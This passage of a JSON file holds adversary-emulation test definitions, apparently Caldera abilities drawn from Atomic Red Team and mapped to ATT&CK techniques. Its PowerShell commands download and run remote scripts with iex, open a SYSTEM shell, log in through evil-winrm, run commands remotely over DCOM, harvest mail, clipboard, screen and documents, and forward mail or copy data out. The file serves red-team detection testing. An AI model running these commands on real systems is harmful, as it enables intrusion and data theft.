        "description": "Simulates an attacker exfiltrating data over SMB over QUIC using the NET USE command.\nPrerequisites:\n  - A file server running Windows Server 2022 Datacenter: Azure Edition\n  - A Windows 11 computer\n  - Windows Admin Center\n",
        "tactic": "lateral-movement",
        "technique": {
            "attack_id": "T1570",
            "name": "Lateral Tool Transfer"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "NET USE * '\\\\example.com\\sales' /TRANSPORT:QUIC /SKIPCERTCHECK; copy 'C:\\path\\to\\file.txt' '*:\\'",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "5458332f329c896a133982a7df20d358",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "5458332f329c896a133982a7df20d358"
    },
    "T1021.006__lateral-movement__Remote Services: Windows Remote Management__e643e21318c069d0a576da91650c76fe": {
        "description": "Powershell Enable WinRM\n\nUpon successful execution, powershell will \"Enable-PSRemoting\" allowing for remote PS access.\n",
        "tactic": "lateral-movement",
        "technique": {
            "attack_id": "T1021.006",
            "name": "Remote Services: Windows Remote Management"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "Enable-PSRemoting -Force",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "e643e21318c069d0a576da91650c76fe",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "e643e21318c069d0a576da91650c76fe"
    },
    "T1021.006__lateral-movement__Remote Services: Windows Remote Management__7844eb9751d121b16f9517817a31eee4": {
        "description": "Simulate lateral movement with PowerShell Remoting on the local host. \nUpon successful execution, PowerShell will execute `whoami` using `Invoke-Command`, targeting the \nlocal machine as remote target.\n",
        "tactic": "lateral-movement",
        "technique": {
            "attack_id": "T1021.006",
            "name": "Remote Services: Windows Remote Management"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Disable-PSRemoting -Force",
                    "command": "Enable-PSRemoting -Force; Invoke-Command -ComputerName $env:COMPUTERNAME -ScriptBlock {whoami}",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "7844eb9751d121b16f9517817a31eee4",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "7844eb9751d121b16f9517817a31eee4"
    },
    "T1570__lateral-movement__Lateral Tool Transfer__4de0ba1566249a72e81e74707cc91a00": {
        "description": "Simulates an attacker exfiltrating data over SMB over QUIC using the New-SmbMapping command.\nPrerequisites:\n  - A file server running Windows Server 2022 Datacenter: Azure Edition\n  - A Windows 11 computer\n  - Windows Admin Center\n",
        "tactic": "lateral-movement",
        "technique": {
            "attack_id": "T1570",
            "name": "Lateral Tool Transfer"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "New-SmbMapping -RemotePath '\\\\example.com\\sales' -TransportType QUIC -SkipCertificateCheck; copy 'C:\\path\\to\\file.txt' 'Z:\\'",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "4de0ba1566249a72e81e74707cc91a00",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "4de0ba1566249a72e81e74707cc91a00"
    },
    "T1021.006__lateral-movement__Remote Services: Windows Remote Management__dce08779676c01d98885e164a1176ac8": {
        "description": "An adversary may attempt to use Evil-WinRM with a valid account to interact with remote systems that have WinRM enabled",
        "tactic": "lateral-movement",
        "technique": {
            "attack_id": "T1021.006",
            "name": "Remote Services: Windows Remote Management"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "evil-winrm -i Target -u Domain\\Administrator -p P@ssw0rd1",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "dce08779676c01d98885e164a1176ac8",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "dce08779676c01d98885e164a1176ac8"
    },
    "T1021.003__lateral-movement__Remote Services: Distributed Component Object Model__68df771632fd6216858edd20458ee5bb": {
        "description": "Powershell lateral movement using the mmc20 application com object.\n\nReference:\n\nhttps://blog.cobaltstrike.com/2017/01/24/scripting-matt-nelsons-mmc20-application-lateral-movement-technique/\n\nUpon successful execution, cmd will spawn calc.exe on a remote computer.\n",
        "tactic": "lateral-movement",
        "technique": {
            "attack_id": "T1021.003",
            "name": "Remote Services: Distributed Component Object Model"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "[activator]::CreateInstance([type]::GetTypeFromProgID(\"MMC20.application\",\"localhost\")).Document.ActiveView.ExecuteShellCommand(\"c:\\windows\\system32\\calc.exe\", $null, $null, \"7\")",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "68df771632fd6216858edd20458ee5bb",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "68df771632fd6216858edd20458ee5bb"
    },
    "T1021.002__lateral-movement__Remote Services: SMB/Windows Admin Shares__31a7326fcc56c71d97da23e3fe1ec364": {
        "description": "Map Admin share utilizing PowerShell\n",
        "tactic": "lateral-movement",
        "technique": {
            "attack_id": "T1021.002",
            "name": "Remote Services: SMB/Windows Admin Shares"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "New-PSDrive -name g -psprovider filesystem -root \\\\Target\\C$",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "31a7326fcc56c71d97da23e3fe1ec364",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "31a7326fcc56c71d97da23e3fe1ec364"
    },
    "T1021.001__lateral-movement__Remote Services: Remote Desktop Protocol__aabe23a58568de3f9cc40e42e5f1b223": {
        "description": "Changing RDP Port to Non Standard Port via Powershell\n",
        "tactic": "lateral-movement",
        "technique": {
            "attack_id": "T1021.001",
            "name": "Remote Services: Remote Desktop Protocol"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Set-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp' -name \"PortNumber\" -Value 3389; Remove-NetFirewallRule -DisplayName \"RDPPORTLatest-TCP-In\" -ErrorAction Ignore ; Get-Service TermService | Restart-Service -Force -ErrorAction Ignore",
                    "command": "Set-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp' -name \"PortNumber\" -Value 4489; New-NetFirewallRule -DisplayName 'RDPPORTLatest-TCP-In' -Profile 'Public' -Direction Inbound -Action Allow -Protocol TCP -LocalPort 4489",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "aabe23a58568de3f9cc40e42e5f1b223",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "aabe23a58568de3f9cc40e42e5f1b223"
    },
    "T1592.001__reconnaissance__Gather Victim Host Information: Hardware__53861bc51eb67cb9775c95b9e02ad141": {
        "description": "Enumerate PlugNPlay Camera using powershell commandlet. this technique was seen in dcrat malware backdoor capabilities where it enumerate the camera info mounted on the compromised host. reference: https://www.mandiant.com/resources/analyzing-dark-crystal-rat-backdoor\n",
        "tactic": "reconnaissance",
        "technique": {
            "attack_id": "T1592.001",
            "name": "Gather Victim Host Information: Hardware"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "Get-CimInstance -Query \"SELECT * FROM Win32_PnPEntity WHERE (PNPClass = 'Image' OR PNPClass = 'Camera')\"",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "53861bc51eb67cb9775c95b9e02ad141",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "53861bc51eb67cb9775c95b9e02ad141"
    },
    "T1114.001__collection__Email Collection: Local Email Collection__21363f92027047ce1dbfdd47f7a483b5": {
        "description": "Search through local Outlook installation, extract mail, compress the contents, and saves everything to a directory for later exfiltration.\nSuccessful execution will produce stdout message stating \"Please be patient, this may take some time...\". Upon completion, final output will be a mail.csv file.\n\nNote: Outlook is required, but no email account necessary to produce artifacts.\n",
        "tactic": "collection",
        "technique": {
            "attack_id": "T1114.001",
            "name": "Email Collection: Local Email Collection"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Remove-Item $env:TEMP\\mail.csv -Force -ErrorAction Ignore",
                    "command": "powershell -executionpolicy bypass -command \"PathToAtomicsFolder\\T1114.001\\src\\Get-Inbox.ps1\" -file $env:TEMP\\mail.csv",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "21363f92027047ce1dbfdd47f7a483b5",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "21363f92027047ce1dbfdd47f7a483b5"
    },
    "T1530__collection__Data from Cloud Storage Object__3b234c1e6518ce41f49be91a20ce45f7": {
        "description": "Upon successful execution, this test will utilize a wordlist to enumerate the public facing containers and blobs of a specified Azure storage account. \nSee https://www.netspi.com/blog/technical/cloud-penetration-testing/anonymously-enumerating-azure-file-resources/ . \n",
        "tactic": "collection",
        "technique": {
            "attack_id": "T1530",
            "name": "Data from Cloud Storage Object"
        },
        "platforms": {
            "unknown": {
                "psh": {
                    "cleanup": "remove-item $env:temp\\T1530Test1.txt -erroraction silentlycontinue",
                    "command": "import-module \"PathToAtomicsFolder\\..\\ExternalPayloads\\Invoke-EnumerateAzureBlobs.ps1\"; Invoke-EnumerateAzureBlobs -base secure -permutations \"PathToAtomicsFolder\\..\\ExternalPayloads\\permutations.txt\" -outputfile \"$env:temp\\T1530Test1.txt\"",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "3b234c1e6518ce41f49be91a20ce45f7",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "3b234c1e6518ce41f49be91a20ce45f7"
    },
    "T1114.003__collection__Email Collection: Email Forwarding Rule__e947c2f5e248a8bbfe0e26b5bf688109": {
        "description": "Creates a new Inbox Rule to forward emails to an external user via the \"ForwardTo\" property of the New-InboxRule Powershell cmdlet.\n",
        "tactic": "collection",
        "technique": {
            "attack_id": "T1114.003",
            "name": "Email Collection: Email Forwarding Rule"
        },
        "platforms": {
            "unknown": {
                "psh": {
                    "cleanup": "$secure_pwd = \"None\" | ConvertTo-SecureString -AsPlainText -Force; $creds = New-Object System.Management.Automation.PSCredential -ArgumentList \"None\", $secure_pwd; Connect-ExchangeOnline -Credential $creds; Get-InboxRule | Where-Object { $_.Name -eq \"Atomic Red Team Email Rule\" | ForEach-Object { Remove-InboxRule -Identity $_.Identity -Force -Confirm:$False }",
                    "command": "$secure_pwd = \"None\" | ConvertTo-SecureString -AsPlainText -Force; $creds = New-Object System.Management.Automation.PSCredential -ArgumentList \"None\", $secure_pwd; Connect-ExchangeOnline -Credential $creds; New-InboxRule -Name \"Atomic Red Team Email Rule\" -ForwardTo \"Atomic_Operator@fakeemail.aq\"",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "e947c2f5e248a8bbfe0e26b5bf688109",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "e947c2f5e248a8bbfe0e26b5bf688109"
    },
    "T1074.001__collection__Data Staged: Local Data Staging__4382d53f0f53399e72c728d019fffd77": {
        "description": "Utilize powershell to download discovery.bat and save to a local file. This emulates an attacker downloading data collection tools onto the host. Upon execution,\nverify that the file is saved in the temp directory.\n",
        "tactic": "collection",
        "technique": {
            "attack_id": "T1074.001",
            "name": "Data Staged: Local Data Staging"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Remove-Item -Force $env:TEMP\\discovery.bat -ErrorAction Ignore",
                    "command": "Invoke-WebRequest \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1074.001/src/Discovery.bat\" -OutFile $env:TEMP\\discovery.bat",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "4382d53f0f53399e72c728d019fffd77",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "4382d53f0f53399e72c728d019fffd77"
    },
    "T1560__collection__Archive Collected Data__8cd2639cb742872b58a2356909628376": {
        "description": "An adversary may compress data (e.g., sensitive documents) that is collected prior to exfiltration.\nWhen the test completes you should find the files from the $env:USERPROFILE directory compressed in a file called T1560-data-ps.zip in the $env:USERPROFILE directory \n",
        "tactic": "collection",
        "technique": {
            "attack_id": "T1560",
            "name": "Archive Collected Data"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Remove-Item -path $env:USERPROFILE\\T1560-data-ps.zip -ErrorAction Ignore",
                    "command": "dir $env:USERPROFILE -Recurse | Compress-Archive -DestinationPath $env:USERPROFILE\\T1560-data-ps.zip",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "8cd2639cb742872b58a2356909628376",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "8cd2639cb742872b58a2356909628376"
    },
    "T1119__collection__Automated Collection__344e7eaf650763e0d3e9f02e62c1cf4b": {
        "description": "collect information for exfiltration. Upon execution, check the users temp directory (%temp%) for files T1119_*.txt\nto see what was collected.\n",
        "tactic": "collection",
        "technique": {
            "attack_id": "T1119",
            "name": "Automated Collection"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Remove-Item $env:TEMP\\T1119_1.txt -ErrorAction Ignore; Remove-Item $env:TEMP\\T1119_2.txt -ErrorAction Ignore; Remove-Item $env:TEMP\\T1119_3.txt -ErrorAction Ignore",
                    "command": "Get-Service > $env:TEMP\\T1119_1.txt; Get-ChildItem Env: > $env:TEMP\\T1119_2.txt; Get-Process > $env:TEMP\\T1119_3.txt",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "344e7eaf650763e0d3e9f02e62c1cf4b",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "344e7eaf650763e0d3e9f02e62c1cf4b"
    },
    "T1119__collection__Automated Collection__0c7c18db582bff4d0da4b4f8fdb2be49": {
        "description": "Automated Collection. Upon execution, check the users temp directory (%temp%) for the folder T1119_powershell_collection\nto see what was collected.\n",
        "tactic": "collection",
        "technique": {
            "attack_id": "T1119",
            "name": "Automated Collection"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Remove-Item $env:TEMP\\T1119_powershell_collection -Force -ErrorAction Ignore | Out-Null",
                    "command": "New-Item -Path $env:TEMP\\T1119_powershell_collection -ItemType Directory -Force | Out-Null; Get-ChildItem -Recurse -Include *.doc | % {Copy-Item $_.FullName -destination $env:TEMP\\T1119_powershell_collection}",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "0c7c18db582bff4d0da4b4f8fdb2be49",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "0c7c18db582bff4d0da4b4f8fdb2be49"
    },
    "T1123__collection__Audio Capture__53d41aa7edbb10cea4c99df8c2b0862f": {
        "description": "[AudioDeviceCmdlets](https://github.com/cdhunt/WindowsAudioDevice-Powershell-Cmdlet)\n",
        "tactic": "collection",
        "technique": {
            "attack_id": "T1123",
            "name": "Audio Capture"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "powershell.exe -Command WindowsAudioDevice-Powershell-Cmdlet",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "53d41aa7edbb10cea4c99df8c2b0862f",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "53d41aa7edbb10cea4c99df8c2b0862f"
    },
    "T1039__collection__Data from Network Shared Drive__73fed1f32224461748c3630217b7d300": {
        "description": "Copy from sensitive File from the c$ of another LAN computer with powershell\nhttps://twitter.com/SBousseaden/status/1211636381086339073",
        "tactic": "collection",
        "technique": {
            "attack_id": "T1039",
            "name": "Data from Network Shared Drive"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Remove-Item -Path \"\\\\127.0.0.1\\C$\\Windows\\temp\\Easter_Bunny.password\"; Remove-Item -Path \"$Env:TEMP\\Easter_egg.password\"",
                    "command": "copy-item -Path \"\\\\127.0.0.1\\C$\\Windows\\temp\\Easter_Bunny.password\" -Destination \"$Env:TEMP\\Easter_egg.password\"",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "73fed1f32224461748c3630217b7d300",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "73fed1f32224461748c3630217b7d300"
    },
    "T1113__collection__Screen Capture__582871bcbf9a88caed89ae25d76d018c": {
        "description": "Use Psr.exe binary to collect screenshots of user display. Test will do left mouse click to simulate user behaviour\n",
        "tactic": "collection",
        "technique": {
            "attack_id": "T1113",
            "name": "Screen Capture"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "rm c:\\temp\\T1113_desktop.zip -ErrorAction Ignore",
                    "command": "cmd /c start /b psr.exe /start /output c:\\temp\\T1113_desktop.zip /sc 1 /gui 0 /stopevent 12; Add-Type -MemberDefinition '[DllImport(\"user32.dll\")] public static extern void mouse_event(int flags, int dx, int dy, int cButtons, int info);' -Name U32 -Namespace W; [W.U32]::mouse_event(0x02 -bor 0x04 -bor 0x01, 0, 0, 0, 0); cmd /c \"timeout 5 > NULL && psr.exe /stop\"",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "582871bcbf9a88caed89ae25d76d018c",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "582871bcbf9a88caed89ae25d76d018c"
    },
    "T1005__collection__Data from Local System__3db695e5387d0fd3bb4e53c330814b7f": {
        "description": "This test searches for files of certain extensions and saves them to a single zip file prior to extraction.                              \n",
        "tactic": "collection",
        "technique": {
            "attack_id": "T1005",
            "name": "Data from Local System"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Remove-Item -Path  $outputZip\\data.zip -Force",
                    "command": "$startingDirectory = \"C:\\Users\"; $outputZip = \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1005\"; $fileExtensionsString = \".doc, .docx, .txt\" ; $fileExtensions = $fileExtensionsString -split \", \"; New-Item -Type Directory $outputZip -ErrorAction Ignore -Force | Out-Null; Function Search-Files {;   param (;     [string]$directory;   );   $files = Get-ChildItem -Path $directory -File -Recurse | Where-Object {;     $fileExtensions -contains $_.Extension.ToLower();   };   return $files; }; $foundFiles = Search-Files -directory $startingDirectory; if ($foundFiles.Count -gt 0) {;   $foundFilePaths = $foundFiles.FullName;   Compress-Archive -Path $foundFilePaths -DestinationPath \"$outputZip\\data.zip\";   Write-Host \"Zip file created: $outputZip\\data.zip\";   } else {;       Write-Host \"No files found with the specified extensions.\";   }",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "3db695e5387d0fd3bb4e53c330814b7f",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "3db695e5387d0fd3bb4e53c330814b7f"
    },
    "T1530__collection__Data from Cloud Storage Object__6f408258cabdeda38f81cfdc239fb6c0": {
        "description": "Upon successful execution, this test will test for anonymous access to Azure storage containers by invoking a web request and outputting the results to a file. \nThe corresponding response could then be interpreted to determine whether or not the resource/container exists, as well as other information. \nSee https://ninocrudele.com/the-three-most-effective-and-dangerous-cyberattacks-to-azure-and-countermeasures-part-2-attack-the-azure-storage-service     \n",
        "tactic": "collection",
        "technique": {
            "attack_id": "T1530",
            "name": "Data from Cloud Storage Object"
        },
        "platforms": {
            "unknown": {
                "psh": {
                    "cleanup": "remove-item $env:temp\\T1530Test2.txt -erroraction silentlycontinue",
                    "command": "try{$response = invoke-webrequest \"https://T1530Test2.blob.core.windows.net/None/None\" -method \"GET\"}; catch [system.net.webexception]; {if($_.Exception.Response -ne $null); {$Response = $_.Exception.Response.GetResponseStream(); $ReadResponse = New-Object System.IO.StreamReader($Response); $ReadResponse.BaseStream.Position = 0; $responseBody = $ReadResponse.ReadToEnd()}; else {$responseBody = \"The storage account could not be anonymously accessed.\"}}; \"Response received for T1530Test2.blob.core.windows.net/None/None: $responsebody\" | out-file -filepath $env:temp\\T1530Test2.txt -append",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "6f408258cabdeda38f81cfdc239fb6c0",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "6f408258cabdeda38f81cfdc239fb6c0"
    },
    "T1074.001__collection__Data Staged: Local Data Staging__885997e230cb2b9dc3cc7e9d8ec5a6d8": {
        "description": "Use living off the land tools to zip a file and stage it in the Windows temporary folder for later exfiltration. Upon execution, Verify that a zipped folder named Folder_to_zip.zip\nwas placed in the temp directory.\n",
        "tactic": "collection",
        "technique": {
            "attack_id": "T1074.001",
            "name": "Data Staged: Local Data Staging"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Remove-Item -Path $env:TEMP\\Folder_to_zip.zip -ErrorAction Ignore",
                    "command": "Compress-Archive -Path \"PathToAtomicsFolder\\T1074.001\\bin\\Folder_to_zip\" -DestinationPath $env:TEMP\\Folder_to_zip.zip -Force",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "885997e230cb2b9dc3cc7e9d8ec5a6d8",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "885997e230cb2b9dc3cc7e9d8ec5a6d8"
    },
    "T1115__collection__Clipboard Data__abd5327a47c4994e2824f833eefe4250": {
        "description": "This module copies the data stored in the user's clipboard and writes it to a file, $env:TEMP\\atomic_T1115_clipboard_data.txt\n",
        "tactic": "collection",
        "technique": {
            "attack_id": "T1115",
            "name": "Clipboard Data"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Remove-Item \"$env:TEMP\\atomic_T1115_clipboard_data.txt\" -ErrorAction Ignore",
                    "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Set-Clipboard -value \"Atomic T1115 Test, grab data from clipboard via VBA\"; IEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing); Invoke-Maldoc -macroFile \"PathToAtomicsFolder\\T1115\\src\\T1115-macrocode.txt\" -officeProduct \"Word\" -sub \"GetClipboard\"",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "abd5327a47c4994e2824f833eefe4250",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "abd5327a47c4994e2824f833eefe4250"
    },
    "T1115__collection__Clipboard Data__8c0f619c7dfd33907bf20b1dfb58022b": {
        "description": "Utilize PowerShell to echo a command to clipboard and execute it\n",
        "tactic": "collection",
        "technique": {
            "attack_id": "T1115",
            "name": "Clipboard Data"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "echo Get-Process | clip; Get-Clipboard | iex",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "8c0f619c7dfd33907bf20b1dfb58022b",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "8c0f619c7dfd33907bf20b1dfb58022b"
    },
    "T1113__collection__Screen Capture__64569d9eb87191fc3cbf365a656e31ab": {
        "description": "Take a screen capture of the desktop through a call to the [Graphics.CopyFromScreen] .NET API.\n\n[Graphics.CopyFromScreen]: https://docs.microsoft.com/en-us/dotnet/api/system.drawing.graphics.copyfromscreen\n",
        "tactic": "collection",
        "technique": {
            "attack_id": "T1113",
            "name": "Screen Capture"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Remove-Item $env:TEMP\\T1113.png -ErrorAction Ignore",
                    "command": "Add-Type -AssemblyName System.Windows.Forms; $screen = [Windows.Forms.SystemInformation]::VirtualScreen; $bitmap = New-Object Drawing.Bitmap $screen.Width, $screen.Height; $graphic = [Drawing.Graphics]::FromImage($bitmap); $graphic.CopyFromScreen($screen.Left, $screen.Top, 0, 0, $bitmap.Size); $bitmap.Save(\"$env:TEMP\\T1113.png\")",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "64569d9eb87191fc3cbf365a656e31ab",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "64569d9eb87191fc3cbf365a656e31ab"
    },
    "T1106__execution__Native API__f6d9c3fbee5549837ea37ff933291656": {
        "description": "Get SYSTEM shell - Pop System Shell using NamedPipe Impersonation technique via function of WinPwn",
        "tactic": "execution",
        "technique": {
            "attack_id": "T1106",
            "name": "Native API"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/NamedPipe/NamedPipeSystem.ps1')",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "f6d9c3fbee5549837ea37ff933291656",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "f6d9c3fbee5549837ea37ff933291656"
    },
    "T1059.001__execution__Command and Scripting Interpreter: PowerShell__a9df2530a06e1aa7d1ba9e9309364b9f": {
        "description": "Powershell execution of known Malicious PowerShell Cmdlets",
        "tactic": "execution",
        "technique": {
            "attack_id": "T1059.001",
            "name": "Command and Scripting Interpreter: PowerShell"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
